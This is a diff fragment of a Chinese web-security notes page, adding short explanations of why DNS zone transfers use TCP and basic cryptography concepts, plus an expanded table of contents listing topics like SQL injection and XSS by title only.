+<p>DNS的规范规定了2种类型的DNS服务器，一个叫主DNS服务器，一个叫辅助DNS服务器。在一个区中主DNS服务器从自己本机的数据文件中读取该区的DNS数据信息，而辅助DNS服务器则从区的主DNS服务器中读取该区的DNS数据信息。当一个辅助DNS服务器启动时，它需要与主DNS服务器通信，并加载数据信息，这就叫做区传送（zone transfer）。 </p>
+<p>区域传送时使用TCP，主要有一下两点考虑： </p>
+<ol>
+<li>辅域名服务器会定时（一般时3小时）向主域名服务器进行查询以便了解数据是否有变动。如有变动，则会执行一次区域传送，进行数据同步。区域传送将使用TCP而不是UDP，因为数据同步传送的数据量比一个请求和应答的数据量要多得多。 （数据量大）</li>
+<li>TCP是一种可靠的连接，保证了数据的准确性。</li>
+</ol>
+<h3 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h3><p><strong>柯克霍夫原则</strong>：除密钥之外，整个系统的一切都是公开的，这个密码体制也必须是安全的。（现代密码学公开加密和解密算法）</p>
+<p>对称加密：序列密码、分组密码（DES、高级加密标准AES） RSA</p>
+<p>非对称加密（公钥加密）：大整数分解、椭圆曲线、离散对数（基于某个复杂的数学难题）</p>
 
       
     </div>
@@ -956,7 +1284,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#OWASP-TOP-10"><span class="nav-number">1.</span> <span class="nav-text">OWASP TOP 10</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL注入"><span class="nav-number">2.</span> <span class="nav-text">SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#攻击技巧"><span class="nav-number">2.1.</span> <span class="nav-text">攻击技巧</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL盲注"><span class="nav-number">2.2.</span> <span class="nav-text">SQL盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#宽字节注入"><span class="nav-number">2.3.</span> <span class="nav-text">宽字节注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#二次注入"><span class="nav-number">2.4.</span> <span class="nav-text">二次注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#绕过方式"><span class="nav-number">2.5.</span> <span class="nav-text">绕过方式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL提权"><span class="nav-number">2.6.</span> <span class="nav-text">SQL提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#防御方式"><span class="nav-number">2.7.</span> <span class="nav-text">防御方式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Mysql-7-2中的改进"><span class="nav-number">2.8.</span> <span class="nav-text">Mysql 7.2中的改进</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sqlmap"><span class="nav-number">2.9.</span> <span class="nav-text">sqlmap</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#浏览器安全"><span class="nav-number">3.</span> <span class="nav-text">浏览器安全</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#同源策略"><span class="nav-number">3.1.</span> <span class="nav-text">同源策略</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#跨域"><span class="nav-number">3.2.</span> <span class="nav-text">跨域</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#OWASP-TOP-10"><span class="nav-number">1.</span> <span class="nav-text">OWASP TOP 10</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL注入"><span class="nav-number">2.</span> <span class="nav-text">SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#攻击技巧"><span class="nav-number">2.1.</span> <span class="nav-text">攻击技巧</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL盲注"><span class="nav-number">2.2.</span> <span class="nav-text">SQL盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#宽字节注入"><span class="nav-number">2.3.</span> <span class="nav-text">宽字节注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#二次注入"><span class="nav-number">2.4.</span> <span class="nav-text">二次注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#绕过方式"><span class="nav-number">2.5.</span> <span class="nav-text">绕过方式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL提权"><span class="nav-number">2.6.</span> <span class="nav-text">SQL提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#防御方式"><span class="nav-number">2.7.</span> <span class="nav-text">防御方式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Mysql-7-2中的改进"><span class="nav-number">2.8.</span> <span class="nav-text">Mysql 7.2中的改进</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sqlmap"><span class="nav-number">2.9.</span> <span class="nav-text">sqlmap</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#浏览器安全"><span class="nav-number">3.</span> <span class="nav-text">浏览器安全</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#同源策略"><span class="nav-number">3.1.</span> <span class="nav-text">同源策略</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#跨域"><span class="nav-number">3.2.</span> <span class="nav-text">跨域</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS"><span class="nav-number">4.</span> <span class="nav-text">XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#XSS危害"><span class="nav-number">4.1.</span> <span class="nav-text">XSS危害</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XSS构造技巧"><span class="nav-number">4.2.</span> <span class="nav-text">XSS构造技巧</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XSS防御"><span class="nav-number">4.3.</span> <span class="nav-text">XSS防御</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#浏览器解码"><span class="nav-number">4.4.</span> <span class="nav-text">浏览器解码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#富文本XSS防御"><span class="nav-number">4.5.</span> <span class="nav-text">富文本XSS防御</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Java反序列化"><span class="nav-number">5.</span> <span class="nav-text">Java反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#POP利用链"><span class="nav-number">5.1.</span> <span class="nav-text">POP利用链</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞挖掘"><span class="nav-number">5.2.</span> <span class="nav-text">漏洞挖掘</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP反序列化"><span class="nav-number">6.</span> <span class="nav-text">PHP反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#PHP反序列化对象注入"><span class="nav-number">6.0.0.1.</span> <span class="nav-text">PHP反序列化对象注入</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#Session反序列化对象"><span class="nav-number">6.0.0.2.</span> <span class="nav-text">Session反序列化对象</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#漏洞挖掘-1"><span class="nav-number">6.0.0.3.</span> <span class="nav-text">漏洞挖掘</span></a></li></ol></li></ol><li class="nav-item nav-level-3"><a class="nav-link" href="#CSRF绕过及防御"><span class="nav-number">7.</span> <span class="nav-text">CSRF绕过及防御</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#文件上传漏洞"><span class="nav-number">8.</span> <span class="nav-text">文件上传漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#渗透测试流程"><span class="nav-number">9.</span> <span class="nav-text">渗透测试流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP安全"><span class="nav-number">10.</span> <span class="nav-text">PHP安全</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Session与Cookie"><span class="nav-number">11.</span> <span class="nav-text">Session与Cookie</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DNS解析顺序"><span class="nav-number">12.</span> <span class="nav-text">DNS解析顺序</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#密码学"><span class="nav-number">13.</span> <span class="nav-text">密码学</span></a></li></div>
             
 
           </div>
